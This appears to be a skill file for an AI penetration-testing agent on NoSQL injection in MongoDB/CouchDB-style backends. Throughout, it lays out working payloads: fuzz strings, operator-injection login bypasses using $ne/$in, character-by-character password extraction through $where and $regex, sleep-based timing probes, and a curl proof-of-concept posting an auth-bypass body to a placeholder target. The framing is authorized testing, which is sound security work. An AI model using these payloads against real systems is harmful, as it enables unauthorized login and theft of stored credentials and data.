---
name: nosql-injection
description: "NoSQL injection (syntax + operator) in MongoDB/CouchDB-style backends -> auth bypass, data extraction. Use for JSON-bodied APIs, login/filter endpoints, JSON query params; operators $ne/$gt/$in/$regex/$where."
---

# NoSQL Injection

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


NoSQL injection is interfering with a query an app sends to a NoSQL datastore. Two distinct classes: **syntax injection** (breaking out of the query string, like classic SQLi) and **operator injection** (smuggling query operators such as `$ne`/`$regex`/`$where` into JSON/params).

## When to test
- JSON-bodied APIs, especially `Content-Type: application/json`.
- Login endpoints (`{"username":...,"password":...}`) and filter/search/category endpoints.
- Backends known or suspected to be MongoDB, CouchDB, or similar document stores.
- Any param whose value plausibly lands in a query object (sort, filter, category, role).

## Impact & priority
- **Auth bypass** (login without valid creds) — high impact, high signal.
- **Data extraction** char-by-char (passwords, hidden fields) — high impact.
- **JS execution via `$where`** — server-side eval, often blind/timing.
- Honest framing: a reflected JS error alone is *not* a finding. Only report when you can demonstrate auth bypass, data exfil, or controlled boolean/timing behavior.

## Detection
**Syntax injection** — fuzz a single value with special chars and watch for errors or behavior change:
```
'"`{ ;$Foo} $Foo \xYZ
```
A `'` that throws a JS/syntax error indicates input reaches the query unsanitized. Then confirm with boolean conditions (note the closing-quote balance):
```
fizzy' && 0 && 'x      -> FALSE (no results)
fizzy' && 1 && 'x      -> TRUE  (results)
fizzy'||'1'=='1        -> always-true (overrides filter, leaks hidden rows)
```

**Operator injection** — swap a string value for an operator object:
```json
{"username":"wiener","password":{"$ne":"x"}}     // password always matches
{"username":{"$ne":"x"},"password":{"$ne":"x"}}  // both fields bypassed
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
```
For URL-encoded/form bodies, operators can sometimes be injected as `username[$ne]=x`.

**Boolean/timing** — when no output differs, use `$where` JS to branch on a condition and measure response time (see Exploitation).

## Exploitation
- **Auth bypass:** `$ne`/`$gt`/`$in` operators in login JSON (above). Target a known/likely admin username with `$in` and bypass the password with `$ne`.
- **Data extraction (syntax):** confirm a field, then walk chars:
  ```
  administrator' && this.password[0]=='a' || 'a'=='b
  ```
  Iterate index and char; TRUE response reveals each char. `this.password.match(/\d/)` narrows charset.
- **`$where` JS injection:** `{"username":"wiener","password":"peter","$where":"0"}` vs `"$where":"1"` to confirm eval. Extract field names: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`.
- **`$regex` extraction:** `{"username":"admin","password":{"$regex":"^a.*"}}` — anchor and extend prefix char-by-char.
- **Timing-based (blind):** `"$where":"sleep(5000)"` to confirm; then branch:
  `function(x){if(x.password[0]==='a'){sleep(5000)}}(this)`.

## Common bypasses
- Encoding: URL-encode the fuzz/payload; a null byte `'%00` can truncate trailing query conditions.
- **Content-type switching**: if form-encoded is sanitized, resend as `application/json` to enable operator objects (and vice versa).
- See `reference.md` for full payload tables and charset-narrowing tactics.

## Minimal PoC
Auth-bypass operator injection, safe and non-destructive — log to `./_EXPLOIT/`:
```bash
curl -sk -X POST 'https://TARGET/api/login' \
  -H 'Content-Type: application/json' \
  --data '{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}' \
  -i
```
Proof = authenticated response (session cookie / 200 + admin context) that a valid-but-unknown password could not otherwise produce. Capture request + response; do not enumerate beyond what proves the bug.

## Don't report as noise
- A reflected JS/syntax error with no behavioral difference and no exploitable boolean/timing/extraction path.
- `$ne` that changes nothing (no bypass, no differential).
- Theoretical operator acceptance without a proven impact. No PoC, no report.

## Deep reference
See `reference.md` for the full methodology, payload tables, and char-by-char extraction recipes.
Source: https://portswigger.net/web-security/nosql-injection
